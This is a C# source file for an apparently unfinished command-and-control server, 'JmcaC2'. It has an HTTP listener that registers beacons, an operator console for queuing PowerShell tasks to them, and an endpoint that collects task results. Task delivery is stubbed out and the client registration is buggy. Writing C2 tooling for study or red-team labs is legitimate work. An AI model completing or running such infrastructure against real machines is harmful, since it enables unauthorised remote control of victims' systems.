using System.Net;
using System.Net.Http;
using System.Security.Cryptography;


namespace JmcaC2
{
    public class Program
    {
        static HttpListener listener = new HttpListener();
        static bool programRunning = true;
        static bool serverRunning = true;
        static int port = 27015;


        static List<BeaconClient> Clients = new List<BeaconClient>();
        static List<BeaconTask> BeaconTasks = new List<BeaconTask>();
        static BeaconClient CurrentBeacon;
        static HashSet<string> ClientNames = new HashSet<string>();

        public static void Main(string[] args)
        {
            // plan for command and control server
            //   1. accept command line arguments
            //   2. start http server in separate thread
            //     2a. accept get requests for beacon tasks
            //     2b. accept post requests for task results
            //   3. accept stdin commands to add tasks, view results, etc.

            Console.WriteLine("Welcome to JmcaC2 Controller");

            // setup the http listener
            listener.Prefixes.Add($"http://localhost:{port}/");
            listener.Start();

            Console.WriteLine($"HTTP Server started on port {port}");

            // handle connections in a separate thread
            Task.Run(HandleConnections);

            while (programRunning)
            {
                Console.Write("JmcaC2> ");
                // According to documentation it will return null only if you press CTRL + Z.
                string? cmd = Console.ReadLine();
                if (string.IsNullOrEmpty(cmd))
                {
                    continue; // ignore empty commands
                }

                string[] CommandParts = cmd.Trim().Split(" ", 2);
                string? CmdPrefix = CommandParts[0];
                string CmdArgs = CommandParts.Length > 1 ? CommandParts[1] : "";

                // process command
                switch (CmdPrefix)
                {
                    case "status":
                        Console.WriteLine("Server running: " + serverRunning);
                        break;
                    case "start":
                        if (!serverRunning)
                        {
                            serverRunning = true;
                            listener.Start();
                            Task.Run(() => HandleConnections());
                            Console.WriteLine("Server started");
                        }
                        else
                        {
                            Console.WriteLine("Server is already running");
                        }
                        break;
                    case "beacons":
                        PrintBeacons();
                        break;

                    case "use":
                        SetCurrentBeaconSession(CmdArgs);
                        break;

                    case "tasks":
                        PrintTasks();
                        break;
                    case "powershell":
                        if (CurrentBeacon == null)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine(" No active beacon selected. Run: use BeaconName");
                            Console.ForegroundColor = ConsoleColor.White;
                            break;
                        }
                        BeaconTasks.Add(new BeaconTask(CurrentBeacon.Name, CmdPrefix, CmdArgs));
                        Console.WriteLine($"Added task for {CurrentBeacon.Name}");
                        break;
                    //  Dictionary<string, string> command = new Dictionary<string, string> { { CmdPrefix, CmdArgs } };
                    case "stop":
                        serverRunning = false;
                        listener.Stop();
                        Console.WriteLine("Server stopped");
                        break;
                    case "exit":
                        programRunning = false;
                        break;

                    // add more commands as needed :)

                    default:
                        Console.WriteLine("Unknown command");
                        break;
                }
            }
        }


        // View currently active beacon connections


        static private string GenerateClientName()
        {

            string ClientName;

            // TODO: COULD INFINITE LOOP IF HAVE AcN connections

            do
            {

                string[] Adjectives = {
                "red","blue","quiet","fast","frozen","silver","dark","bright","wild","rapid",
                "lone","brave","lucky","silent","stealthy","shadow","storm","fierce"
            };

                string[] Nouns = {
                "wolf","hawk","tiger","eagle","shadow","river","mountain","lion","falcon",
                "forest","blade","cloud","spider","viper","storm","flame"
            };

                int adjIndex = RandomNumberGenerator.GetInt32(Adjectives.Length);
                int nounIndex = RandomNumberGenerator.GetInt32(Nouns.Length);
                ClientName = $"{Adjectives[adjIndex].ToUpper()}_{Nouns[nounIndex].ToUpper()}";

            } while (ClientNames.Contains(ClientName));

            ClientNames.Add(ClientName);
            return ClientName;

        }

        public static void SetCurrentBeaconSession(string name)
        {
            if (string.IsNullOrWhiteSpace(name))
            {
                Console.WriteLine("Usage: use BeaconName");
                return;
            }

            foreach (var client in Clients)
            {
                if (client.Name == name)
                {
                    CurrentBeacon = client;
                    Console.WriteLine($"Current beacon set to {client.Name}");
                    return;
                }
            }

            Console.WriteLine($"Beacon '{name}' not found");
        }
        public static void PrintBeacons()
        {
            if (Clients == null || Clients.Count == 0)
            {
                Console.WriteLine("No Active Connections!");
                return;
            }

            Console.WriteLine($"{"Beacon Name",-15} | {"Client IP",-14} | {"Last CheckIn",-20}");
            Console.WriteLine("--------------------------------------------------------------");

            foreach (var client in Clients)
            {
                ConsoleColor prevColor = Console.ForegroundColor;

                bool isCurrent = CurrentBeacon != null &&
                                 !string.IsNullOrEmpty(client.Name) &&
                                 client.Name == CurrentBeacon.Name;

                if (isCurrent)
                    Console.ForegroundColor = ConsoleColor.DarkCyan;

                Console.WriteLine(client.ToString());

                Console.ForegroundColor = prevColor;

                // TODO: MAKE RED if configured last-checkin time > sleep time 
            }
        }

        // Handle incoming HTTP connections
        // GET requests are for beacon tasks
        // POST requests are for task results

        public static void PrintTasks()
        {
            Console.WriteLine($"{"Client Name",-15} | {"Task Name",-14} | {"Task Args",-20}");
            Console.WriteLine("---------------------------------------------------------------");

            foreach (var task in BeaconTasks)
                Console.WriteLine(task);
        }


        public static void HandleConnections()
        {
            while (serverRunning)
            {
                try
                {
                    var context = listener.GetContext();
                    var request = context.Request;
                    var response = context.Response;
                    if (request.HttpMethod == "GET")
                    {
                        // Handle GET request for beacon tasks
                        Console.WriteLine($"Received request for tasks from {request.RemoteEndPoint.Address}");


                        string responseString = "No Tasks";
                        // if (BeaconTasks.Count > 0)
                        // {
                        // foreach (BeaconTask CurrentTask in BeaconTasks)
                        // {
                        // CurrentTask.CmdPrefix + CurrentTask.CmdArgs;

                        // }

                        // }
                        // TODO HANDLE PUSHING TASKS
                        byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString);
                        response.ContentLength64 = buffer.Length;

                        var output = response.OutputStream;
                        output.Write(buffer, 0, buffer.Length);
                        output.Close();

                        // FIXME: MAJOR WEWOO THIS ADDs CLIENT ON EVERY GET SO IF I FETCH TASKS I ADD NEW PERSON THIS IS NO GOOD

                        BeaconClient NewClient = new BeaconClient(request.RemoteEndPoint.Address, DateTime.Now, GenerateClientName());
                        Clients.Add(NewClient);
                        Console.WriteLine($"Added {NewClient.Name}");

                    }
                    else if (request.HttpMethod == "POST")
                    {
                        // Handle POST request for task results
                        Console.WriteLine("Received POST request for task results");
                        using (var reader = new System.IO.StreamReader(request.InputStream, request.ContentEncoding))
                        {
                            string result = reader.ReadToEnd();
                            Console.WriteLine("Task Result: " + result);
                        }
                        response.StatusCode = (int)HttpStatusCode.OK;
                        response.Close();
                    }
                }
                catch (Exception e)
                {
                    // exception handling request
                    Console.WriteLine("Error handling connection: " + e.Message);
                }
            }
        }
    }
}